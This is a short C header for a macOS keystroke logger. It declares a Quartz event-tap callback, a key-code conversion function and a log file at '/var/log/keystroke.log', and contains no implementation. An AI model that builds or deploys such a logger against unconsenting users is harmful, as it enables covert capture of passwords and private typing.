#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

FILE *logfile = NULL;
const char *logfileLocation = "/var/log/keystroke.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int, bool, bool);

#endif